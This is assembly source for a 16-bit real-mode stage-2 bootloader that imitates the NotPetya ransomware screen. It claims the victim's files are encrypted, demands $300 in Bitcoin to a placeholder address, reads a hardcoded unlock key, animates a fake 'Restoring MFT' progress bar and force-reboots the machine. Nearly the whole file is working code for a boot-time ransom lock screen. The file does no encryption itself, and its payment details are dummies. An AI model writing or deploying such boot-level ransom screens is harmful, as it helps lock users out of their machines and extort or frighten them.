; stage2.asm - Stage 2 Bootloader (NotPetya Style)
; Functionality: Displays ransomware UI, handles password validation, and visual effects.
; Target: 16-bit Real Mode (x86)

[BITS 16]                 ; Set processor to 16-bit real mode
[ORG 0x0000]              ; Define origin at 0x0000 (relative to segment 0x1000)

start:
    ; Register Initialization
    cli                   ; Clear interrupts to prevent execution during segment setup
    mov ax, 0x1000        ; Set AX to the target segment address
    mov ds, ax            ; Initialize Data Segment
    mov es, ax            ; Initialize Extra Segment 
    mov ss, ax            ; Initialize Stack Segment
    mov sp, 0xFFFE        ; Set Stack Pointer to the top of the segment
    sti                   ; Re-enable interrupts after stack is safe

    ; Video Initialization
    mov ax, 0x0003        ; BIOS function: Set Video Mode 3 (80x25 Text, 16 colors)
    int 0x10              ; Execute video interrupt

    ; Screen Background Painting
    mov ah, 0x06          ; BIOS function: Scroll Up/Clear Window
    xor al, al            ; AL=0 means clear the entire window
    xor cx, cx            ; CH=0, CL=0 (Upper left corner: Row 0, Col 0)
    mov dx, 0x184F        ; DH=24, DL=79 (Lower right corner: Row 24, Col 79)
    mov bh, 0x4F          ; Attribute: Background Red (4), Foreground White (F)
    int 0x10              ; Execute fill color

    ; Hardware Border Configuration
    mov ah, 0x0B          ; BIOS function: Set Color Palette/Border
    mov bh, 0x00          ; BH=0 indicates setting the border (overscan) color
    mov bl, 0x04          ; BL=4 sets the border to Red
    int 0x10              ; Execute border color change

    ; VGA Controller Low-Level Access (Overscan Fix)
    mov dx, 0x3DA         ; Point to VGA Input Status Register 1
    in al, dx             ; Read to reset the Attribute Controller flip-flop
    mov dx, 0x3C0         ; Point to Attribute Controller Address Register
    mov al, 0x31          ; Index 0x11 (Overscan Color) + Bit 5 (Enable Video)
    out dx, al            ; Send index to VGA port
    mov al, 0x04          ; Color value 4 (Red)
    out dx, al            ; Apply color to the overscan/border area
    mov al, 0x20          ; Value to re-enable video signal
    out dx, al            ; Execute video re-enable

    ; UI Rendering - Header Section
    mov dh, 0             ; Set cursor Row 0
    mov dl, 1             ; Set cursor Column 1
    mov si, header_bar    ; Load string pointer
    mov bl, 0xCF          ; Attribute: Bright White Blinking (C) on Red (F)
    call print_at_pos     ; Call custom print routine

    ; UI Rendering - Top Separator
    mov dh, 1             ; Set cursor Row 1
    mov dl, 0             ; Set cursor Column 0
    mov si, separator_bar ; Load string pointer
    mov bl, 0x4F          ; Attribute: White on Red
    call print_at_pos

    ; UI Rendering - Main Ransom Title
    mov dh, 3             ; Set cursor Row 3
    mov dl, 0             ; Set cursor Column 0
    mov si, main_title    ; Load string pointer
    mov bl, 0x4E          ; Attribute: Yellow (E) on Red (4)
    call print_at_pos

    ; UI Rendering - Sub Separator
    mov dh, 4             ; Set cursor Row 4
    mov dl, 0             ; Set cursor Column 0
    mov si, separator_bar ; Load string pointer
    mov bl, 0x4F          ; Attribute: White on Red
    call print_at_pos

    ; UI Rendering - Main Paragraph (Lines 6 to 9)
    mov dh, 6             ; Row 6
    mov dl, 0             ; Column 0
    mov si, para1_line1
    mov bl, 0x4F
    call print_at_pos

    mov dh, 7             ; Row 7
    mov dl, 0
    mov si, para1_line2
    mov bl, 0x4F
    call print_at_pos

    mov dh, 8             ; Row 8
    mov dl, 0
    mov si, para1_line3
    mov bl, 0x4F
    call print_at_pos

    mov dh, 9             ; Row 9
    mov dl, 0
    mov si, para1_line4
    mov bl, 0x4F
    call print_at_pos

    ; UI Rendering - Instruction Section (Lines 11 to 21)
    mov dh, 11            ; Row 11
    mov dl, 0
    mov si, para2_line1
    mov bl, 0x4F
    call print_at_pos

    mov dh, 12            ; Row 12
    mov dl, 0
    mov si, para2_line2
    mov bl, 0x4F
    call print_at_pos

    mov dh, 14            ; Row 14
    mov dl, 0
    mov si, instructions_header
    mov bl, 0x4F
    call print_at_pos

    mov dh, 16            ; Row 16
    mov dl, 0
    mov si, instruction1
    mov bl, 0x4F
    call print_at_pos

    mov dh, 18            ; Row 18
    mov dl, 3             ; Indented Column 3
    mov si, bitcoin_address
    mov bl, 0x4E          ; Attribute: Yellow on Red
    call print_at_pos

    mov dh, 20            ; Row 20
    mov dl, 0
    mov si, instruction2_line1
    mov bl, 0x4F
    call print_at_pos

    mov dh, 21            ; Row 21
    mov dl, 3             ; Indented Column 3
    mov si, instruction2_line2
    mov bl, 0x4F
    call print_at_pos

    ; UI Rendering - Password Prompt (Lines 23 to 24)
    mov dh, 23            ; Row 23
    mov dl, 0
    mov si, key_prompt_line1
    mov bl, 0x4F
    call print_at_pos

    mov dh, 24            ; Row 24
    mov dl, 0
    mov si, key_prompt_line2
    mov bl, 0x4F
    call print_at_pos

    ; Input Preparation
    mov dh, 24            ; Set Row 24
    mov dl, 5             ; Set Column 5 (directly after "Key: ")
    mov ah, 0x02          ; BIOS function: Set Cursor Position
    mov bh, 0x00          ; Page 0
    int 0x10              ; Move the blinking cursor

    mov ah, 0x01          ; BIOS function: Set Cursor Shape
    mov cx, 0x0607        ; Standard underline cursor size
    int 0x10              ; Apply cursor shape

    xor si, si            ; Clear SI to use as buffer index

password_input:
    mov ah, 0x00          ; BIOS function: Get Keystroke
    int 0x16              ; Wait for user input (returns AL=ASCII)

    cmp al, 13            ; Check if key is 'Enter' (ASCII 13)
    je check_password     ; If Enter, proceed to validation

    cmp al, 8             ; Check if key is 'Backspace' (ASCII 8)
    je handle_backspace   ; If Backspace, jump to deletion logic

    cmp si, 20            ; Check if buffer is full (max 20 chars)
    jge password_input    ; If full, ignore input and loop back

    cmp al, 32            ; Check if character is below printable range
    jl password_input     ; Ignore non-printable
    cmp al, 126           ; Check if character is above printable range
    jg password_input     ; Ignore non-printable

    mov [password_buffer + si], al ; Store ASCII character in memory buffer
    inc si                ; Increment index pointer

    mov ah, 0x0E          ; BIOS function: Teletype Output
    mov al, '*'           ; Character to mask the input
    mov bh, 0x00          ; Page 0
    mov bl, 0x4F          ; White on Red
    int 0x10              ; Print the asterisk to screen

    jmp password_input    ; Repeat input loop

handle_backspace:
    cmp si, 0             ; Check if buffer is already empty
    je password_input     ; If empty, do nothing

    dec si                ; Decrement buffer index
    
    mov ah, 0x03          ; BIOS function: Get Cursor Position
    mov bh, 0x00          ; Page 0
    int 0x10              ; Returns current DL (column)
    
    dec dl                ; Move column back by one
    mov ah, 0x02          ; BIOS function: Set Cursor Position
    int 0x10              ; Move cursor to the character to be deleted
    
    mov ah, 0x0A          ; BIOS function: Write Character Only
    mov al, ' '           ; Use a space to erase the asterisk
    mov cx, 1             ; Write only 1 space
    int 0x10              ; Execute erase
    
    jmp password_input    ; Return to input loop

check_password:
    mov byte [password_buffer + si], 0 ; Null-terminate the user input
    
    mov si, password_buffer ; Pointer to user input
    mov di, correct_password ; Pointer to hardcoded key
    mov cx, 11            ; Length of the correct password including null

compare_loop:
    mov al, [ds:si]       ; Load char from buffer
    mov bl, [ds:di]       ; Load char from correct key
    cmp al, bl            ; Compare characters
    jne wrong_password    ; If mismatch, jump to error logic
    
    test al, al           ; Check if we reached the null terminator (end of string)
    jz password_correct   ; If null reached and matched, password is correct
    
    inc si                ; Move to next character in buffer
    inc di                ; Move to next character in key
    loop compare_loop     ; Repeat comparison

password_correct:
    mov dh, 24            ; Targeted row 24
    mov dl, 0             ; Start of line
    call clear_line       ; Wipe the input prompt area

    mov dh, 24            ; Row 24
    mov dl, 0
    mov si, loading_text  ; Load "Restoring MFT: ["
    mov bl, 0x4F          ; White on Red
    call print_at_pos

    mov dh, 24            ; Row 24
    mov dl, 16            ; Move cursor inside the brackets
    mov ah, 0x02          ; Set Cursor Position
    mov bh, 0x00
    int 0x10

    mov cx, 20            ; Counter for 20 progress bar segments

loading_loop:
    push cx               ; Preserve loop counter
    mov ah, 0x09          ; BIOS function: Write Char/Attribute
    mov al, '#'           ; Progress bar character
    mov bh, 0x00
    mov bl, 0x4E          ; Yellow on Red
    push cx               ; Preserve CX for int 0x10
    mov cx, 1             ; Write one '#'
    int 0x10
    pop cx                ; Restore CX

    mov ah, 0x03          ; Get current cursor position
    mov bh, 0x00
    int 0x10              ; Result in DH, DL
    
    inc dl                ; Move column forward
    mov ah, 0x02          ; Set new cursor position
    int 0x10

    mov ah, 0x86          ; BIOS function: Wait (Delay)
    mov cx, 0x0001        ; High word of 100,000 microseconds
    mov dx, 0x86A0        ; Low word
    int 0x15              ; Execution pause

    pop cx                ; Restore loop counter
    loop loading_loop     ; Next segment

    mov dh, 24            ; Row 24
    mov dl, 36            ; Position after the 20 '#' marks
    mov si, loading_complete ; "] 100% Done!"
    mov bl, 0x4E          ; Yellow on Red
    call print_at_pos

    mov ah, 0x86          ; BIOS function: Wait
    mov cx, 0x001E        ; High word of 2,000,000 microseconds
    mov dx, 0x8480        ; Low word
    int 0x15              ; Wait for 2 seconds before reboot

    mov al, 0xFE          ; Keyboard controller reset command
    out 0x64, al          ; Force system restart via Port 64h

    cli                   ; If reset fails, stop interrupts
    lidt [null_idt]       ; Load an empty Interrupt Descriptor Table
    int 3                 ; Force a triple fault to crash and reboot

wrong_password:
    mov ah, 0x01          ; BIOS function: Set Cursor Shape
    mov cx, 0x2000        ; Bit 5 set (value 0x20) hides the cursor
    int 0x10

    mov cx, 6             ; Set panic effect to blink 6 times

panic_blink_loop:
    push cx               ; Save blink count
    
    ; Black Screen Phase
    mov ah, 0x06          ; Clear window
    xor al, al            ; Full clear
    xor cx, cx            ; Top left
    mov dx, 0x184F        ; Bottom right
    mov bh, 0x00          ; Black background
    int 0x10
    
    mov ah, 0x0B          ; Set Border
    mov bh, 0x00
    mov bl, 0x00          ; Black border
    int 0x10
    
    mov ah, 0x86          ; Delay 100ms
    mov cx, 0x0001
    mov dx, 0x86A0
    int 0x15

    ; Red Screen Phase
    mov ah, 0x06          ; Clear window
    xor al, al            ; Full clear
    xor cx, cx            ; Top left
    mov dx, 0x184F        ; Bottom right
    mov bh, 0x4F          ; Red background
    int 0x10
    
    mov ah, 0x0B          ; Set Border
    mov bh, 0x00
    mov bl, 0x04          ; Red border
    int 0x10
    
    mov ah, 0x86          ; Delay 100ms
    mov cx, 0x0001
    mov dx, 0x86A0
    int 0x15

    pop cx                ; Restore blink count
    loop panic_blink_loop

    ; Restore VGA Overscan settings
    mov dx, 0x3DA
    in al, dx
    mov dx, 0x3C0
    mov al, 0x31
    out dx, al
    mov al, 0x04
    out dx, al
    mov al, 0x20
    out dx, al

    call redraw_screen    ; Re-render all ransom text

    mov dh, 24            ; Row 24
    mov dl, 0
    call clear_line       ; Clear input area

    mov dh, 24            ; Row 24
    mov dl, 0
    mov si, msg_wrong     ; "Wrong key! Try again..."
    mov bl, 0xCE          ; Blinking Yellow on Red
    call print_at_pos

    mov ah, 0x86          ; Wait 1.5 seconds
    mov cx, 0x0016
    mov dx, 0xE360
    int 0x15

    mov dh, 24            ; Row 24
    mov dl, 0
    call clear_line       ; Clean the message away

    mov dh, 24            ; Row 24
    mov dl, 0
    mov si, key_prompt_line2 ; Redraw "Key: "
    mov bl, 0x4F
    call print_at_pos

    mov dh, 24            ; Cursor back to input position
    mov dl, 5
    mov ah, 0x02
    int 0x10

    mov ah, 0x01          ; Show cursor again
    mov cx, 0x0607
    int 0x10
    
    xor si, si            ; Reset buffer index for new attempt
    jmp password_input    ; Jump back to keyboard listening

redraw_screen:
    pusha                 ; Push all general purpose registers to stack
    
    ; Redraws UI elements sequentially without manual cursor positioning in loop
    mov dh, 0
    mov dl, 1
    mov si, header_bar
    mov bl, 0xCF
    call print_at_pos
    
    mov dh, 1
    mov dl, 0
    mov si, separator_bar
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 3
    mov dl, 0
    mov si, main_title
    mov bl, 0x4E
    call print_at_pos
    
    mov dh, 4
    mov dl, 0
    mov si, separator_bar
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 6
    mov dl, 0
    mov si, para1_line1
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 7
    mov dl, 0
    mov si, para1_line2
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 8
    mov dl, 0
    mov si, para1_line3
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 9
    mov dl, 0
    mov si, para1_line4
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 11
    mov dl, 0
    mov si, para2_line1
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 12
    mov dl, 0
    mov si, para2_line2
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 14
    mov dl, 0
    mov si, instructions_header
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 16
    mov dl, 0
    mov si, instruction1
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 18
    mov dl, 3
    mov si, bitcoin_address
    mov bl, 0x4E
    call print_at_pos
    
    mov dh, 20
    mov dl, 0
    mov si, instruction2_line1
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 21
    mov dl, 3
    mov si, instruction2_line2
    mov bl, 0x4F
    call print_at_pos
    
    mov dh, 23
    mov dl, 0
    mov si, key_prompt_line1
    mov bl, 0x4F
    call print_at_pos
    
    popa                  ; Restore all registers
    ret

clear_line:
    pusha                 ; Save context
    mov dl, 0             ; Move to column 0
    mov ah, 0x02          ; Set Cursor Position
    mov bh, 0x00
    int 0x10
    
    mov ah, 0x09          ; Write Char/Attribute
    mov al, ' '           ; Character: Space
    mov bh, 0x00
    mov bl, 0x4F          ; Red background, White foreground
    mov cx, 80            ; Perform 80 times (full width)
    int 0x10
    
    popa                  ; Restore context
    ret

print_at_pos:
    pusha                 ; Save all registers
    mov ah, 0x02          ; Set initial cursor position from DH/DL
    mov bh, 0x00          ; Page 0
    int 0x10
    
.loop:
    mov al, [ds:si]       ; Load current character from string
    test al, al           ; Check for null (0)
    jz .done              ; End of string found
    
    mov ah, 0x09          ; Write Char with Attribute
    mov bh, 0x00
    mov cx, 1             ; Write only 1 char
    int 0x10              ; Execute (doesn't move cursor)
    
    inc dl                ; Increment column manually
    mov ah, 0x02          ; Set updated cursor position
    int 0x10
    
    inc si                ; Point to next character
    jmp .loop             ; Continue loop
    
.done:
    popa                  ; Restore all registers
    ret

; String Data Definitions
header_bar:         db '!!!WARNING!!! YOUR FILES HAVE BEEN ENCRYPTED !!!WARNING!!!', 0
separator_bar:      db '================================================================================', 0
main_title:         db 'Ooops, your important files are encrypted.', 0
para1_line1:        db 'If you see this text, then your files are no longer accessible, because they', 0
para1_line2:        db 'have been encrypted.  Perhaps you are busy looking for a way to recover your', 0
para1_line3:        db 'files, but don', 39, 't waste your time.  Nobody can recover your files without our', 0
para1_line4:        db 'decryption service.', 0
para2_line1:        db 'We guarantee that you can recover all your files safely and easily.  All you', 0
para2_line2:        db 'need to do is submit the payment and purchase the decryption key.', 0
instructions_header: db 'Please follow the instructions:', 0
instruction1:       db '1. Send $300 worth of Bitcoin to following address:', 0
bitcoin_address:    db '1FAKE777xTuR2Rit7BmGSdzaAtNbHX999', 0
instruction2_line1: db '2. Send your Bitcoin wallet ID and personal installation key to e-mail', 0
instruction2_line2: db 'danko1122q@exaple.com. Your personal installation key:', 0
key_prompt_line1:   db 'If you already purchased your key, please enter it below.', 0
key_prompt_line2:   db 'Key: ', 0
loading_text:       db 'Restoring MFT: [', 0
loading_complete:   db '] 100% Done!', 0
msg_wrong:          db 'Wrong key! Try again...', 0
correct_password:   db '1028952853', 0
password_buffer:    times 21 db 0
null_idt:           dw 0, 0, 0 ; Empty structure to trigger triple fault

; Padding to 10 Sectors (5120 bytes)
times 5120-($-$$) db 0
